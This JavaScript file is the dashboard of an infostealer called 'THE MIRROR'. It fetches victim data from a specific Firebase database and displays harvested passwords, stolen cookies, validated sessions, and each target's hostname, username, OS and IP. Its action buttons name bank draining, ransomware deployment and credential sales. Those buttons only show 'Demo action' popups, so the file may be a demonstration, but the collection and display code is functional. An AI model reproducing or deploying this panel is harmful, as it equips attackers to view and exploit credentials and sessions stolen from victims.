// ============================================
// THE MIRROR - Dashboard
// Works with public GitHub repository
// No server required, no token required
// ============================================


const FIREBASE_URL = "https://shadow-sync-3aee0-default-rtdb.firebaseio.com/";
let collectionsData = [];


// ============================================
// LOAD ALL COLLECTIONS
// ============================================
async function loadCollections() {
  try {
    const response = await fetch(`${FIREBASE_URL}/devices.json`);
    const data = await response.json();

    const collections = [];
    if (data) {
      for (const deviceId in data) {
        for (const timestamp in data[deviceId]) {
          collections.push(data[deviceId][timestamp]);
        }
      }
    }

    collections.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
    collectionsData = collections;
    updateDashboard();
  } catch (e) {
    console.error("Error loading from Firebase:", e);
    document.getElementById("overview").innerHTML = `
      <div class="empty-state">
        <h2>Failed to load data</h2>
        <p>${e.message}</p>
      </div>
    `;
  }
}
// ============================================
// AGGREGATE HELPERS
// ============================================
function getAllPasswords() {
  const all = [];
  for (const c of collectionsData) {
    all.push(...(c.passwords || []));
  }
  return all;
}

function getAllCookies() {
  const all = [];
  for (const c of collectionsData) {
    all.push(...(c.cookies || []));
  }
  return all;
}

function getAllSessions() {
  const all = [];
  for (const c of collectionsData) {
    all.push(...(c.valid_sessions || []));
  }
  return all;
}

// ============================================
// RENDER FUNCTIONS
// ============================================
function updateDashboard() {
  const latest = collectionsData[collectionsData.length - 1];
  const allPasswords = getAllPasswords();
  const allCookies = getAllCookies();
  const allSessions = getAllSessions();

  // Overview
  document.getElementById("overview").innerHTML = `
    <div class="stats-grid">
      <div class="stat-card">
        <div class="stat-label">Total Collections</div>
        <div class="stat-value">${collectionsData.length}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Passwords Found</div>
        <div class="stat-value">${allPasswords.length}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Active Sessions</div>
        <div class="stat-value">${allSessions.length}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Cookies Stolen</div>
        <div class="stat-value">${allCookies.length}</div>
      </div>
    </div>

    ${latest ? `
      <div class="target-info">
        <h3>Target Information</h3>
        <table>
          <tr><td>Hostname:</td><td>${latest.hostname || "Unknown"}</td></tr>
          <tr><td>Username:</td><td>${latest.username || "Unknown"}</td></tr>
          <tr><td>OS:</td><td>${latest.os || "Unknown"}</td></tr>
          <tr><td>IP Address:</td><td>${latest.ip || "Unknown"}</td></tr>
          <tr><td>Last Seen:</td><td>${latest.received_at || latest.timestamp || "Unknown"}</td></tr>
        </table>
      </div>
    ` : ""}
  `;

  // Passwords
  document.getElementById("passwords").innerHTML = renderPasswords(allPasswords);
  // Cookies
  document.getElementById("cookies").innerHTML = renderCookies(allCookies);
  // Sessions
  document.getElementById("sessions").innerHTML = renderSessions(allSessions);
  // Actions
  document.getElementById("actions").innerHTML = renderActions();
}

function renderPasswords(passwords) {
  if (passwords.length === 0) return "<p>No passwords found.</p>";
  return `
    <table class="data-table">
      <thead>
        <tr><th>URL</th><th>Username</th><th>Password</th></tr>
      </thead>
      <tbody>
        ${passwords.map(p => `
          <tr>
            <td>${p.url || ""}</td>
            <td>${p.username || ""}</td>
            <td class="password-cell">${p.password || ""}</td>
          </tr>
        `).join("")}
      </tbody>
    </table>
  `;
}

function renderCookies(cookies) {
  if (cookies.length === 0) return "<p>No cookies found.</p>";
  return `
    <table class="data-table">
      <thead>
        <tr><th>Host</th><th>Name</th><th>Value</th></tr>
      </thead>
      <tbody>
        ${cookies.map(c => `
          <tr>
            <td>${c.host || ""}</td>
            <td>${c.name || ""}</td>
            <td class="password-cell">${c.value || ""}</td>
          </tr>
        `).join("")}
      </tbody>
    </table>
  `;
}

function renderSessions(sessions) {
  if (sessions.length === 0) return "<p>No valid sessions found.</p>";
  return `
    <table class="data-table">
      <thead>
        <tr><th>Service</th><th>Cookie Name</th><th>Status</th></tr>
      </thead>
      <tbody>
        ${sessions.map(s => `
          <tr>
            <td>${s.cookie?.host || ""}</td>
            <td>${s.cookie?.name || ""}</td>
            <td class="valid-badge">VALID</td>
          </tr>
        `).join("")}
      </tbody>
    </table>
  `;
}

function renderActions() {
  return `
    <div class="action-grid">
      <button class="action-btn danger" onclick="alert('Demo action: Drain all bank accounts')">💰 Drain All Bank Accounts</button>
      <button class="action-btn danger" onclick="alert('Demo action: Empty crypto wallets')">🪙 Empty Crypto Wallets</button>
      <button class="action-btn danger" onclick="alert('Demo action: Reset all passwords')">🔑 Reset All Passwords</button>
      <button class="action-btn danger" onclick="alert('Demo action: Spin up 1000 AWS instances')">☁️ Spin Up 1000 AWS Instances</button>
      <button class="action-btn danger" onclick="alert('Demo action: Sell credentials on dark web')">🌐 Sell Credentials on Dark Web</button>
      <button class="action-btn danger" onclick="alert('Demo action: Lock target out of all accounts')">🔒 Lock Target Out of All Accounts</button>
      <button class="action-btn danger" onclick="alert('Demo action: Send ransomware to work network')">💣 Send Ransomware to Work Network</button>
      <button class="action-btn danger" onclick="alert('Demo action: Delete all cloud data')">🗑️ Delete All Cloud Data</button>
      <button class="action-btn success" onclick="alert('SAFE MODE: All data wiped')">🛡️ SAFE MODE - Wipe All Data</button>
    </div>
  `;
}

// ============================================
// INIT
// ============================================
loadCollections();
